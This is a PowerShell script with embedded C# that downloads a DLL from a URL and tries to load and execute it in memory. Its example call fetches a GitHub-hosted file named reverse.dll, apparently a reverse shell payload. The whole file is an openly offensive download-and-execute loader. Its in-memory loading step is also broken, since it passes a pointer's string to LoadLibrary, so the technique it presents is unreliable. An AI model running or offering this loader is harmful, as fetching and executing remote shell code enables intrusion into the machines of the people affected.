# Add necessary P/Invoke signatures for loading and executing a DLL in memory

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MemoryLoader {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string libname);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern bool FreeLibrary(IntPtr hModule);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    public static void LoadDll(byte[] dllBytes) {
        // Allocate memory for the DLL
        IntPtr dllMemory = Marshal.AllocHGlobal(dllBytes.Length);
        Marshal.Copy(dllBytes, 0, dllMemory, dllBytes.Length);

        // Create a PE image
        IntPtr moduleHandle = LoadLibrary(dllMemory.ToString());

        if (moduleHandle == IntPtr.Zero) {
            throw new Exception("Failed to load DLL.");
        }

        IntPtr entryPoint = GetProcAddress(moduleHandle, "DllMain");

        if (entryPoint == IntPtr.Zero) {
            FreeLibrary(moduleHandle);
            throw new Exception("Failed to locate DllMain.");
        }

        DllMain dllMain = (DllMain)Marshal.GetDelegateForFunctionPointer(entryPoint, typeof(DllMain));
        int result = dllMain(moduleHandle, 1, IntPtr.Zero); // Call the DLL's entry point

        // Free the DLL after use
        FreeLibrary(moduleHandle);
        Marshal.FreeHGlobal(dllMemory);
    }
}
"@

# Function to download the DLL from a given URL
function Download-DLL {
    param (
        [string]$Url
    )
    
    try {
        # Download the DLL from the URL and return it as a byte array
        Write-Host "[*] Downloading DLL from $Url"
        $dllBytes = (New-Object System.Net.WebClient).DownloadData($Url)
        Write-Host "[+] DLL downloaded successfully"
        return $dllBytes
    } catch {
        Write-Host "[!] Failed to download DLL: $_"
        return $null
    }
}

# Function to load and execute the DLL in memory
function Invoke-DLLInMemory {
    param (
        [string]$DllUrl
    )

    # Step 1: Download the DLL from the web
    $dllBytes = Download-DLL -Url $DllUrl
    
    if (-not $dllBytes) {
        Write-Host "[!] DLL download failed. Exiting."
        return
    }

    # Step 2: Load the DLL into memory and execute it
    Write-Host "[*] Loading and executing DLL in memory"
    
    try {
        # Load the DLL into memory and call DllMain
        [MemoryLoader]::LoadDll($dllBytes)
        Write-Host "[+] DLL successfully loaded and executed in memory"
    } catch {
        Write-Host "[!] Error executing DLL in memory: $_"
    }
}

# Example usage: Replace with your DLL URL
Invoke-DLLInMemory -DllUrl "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll"
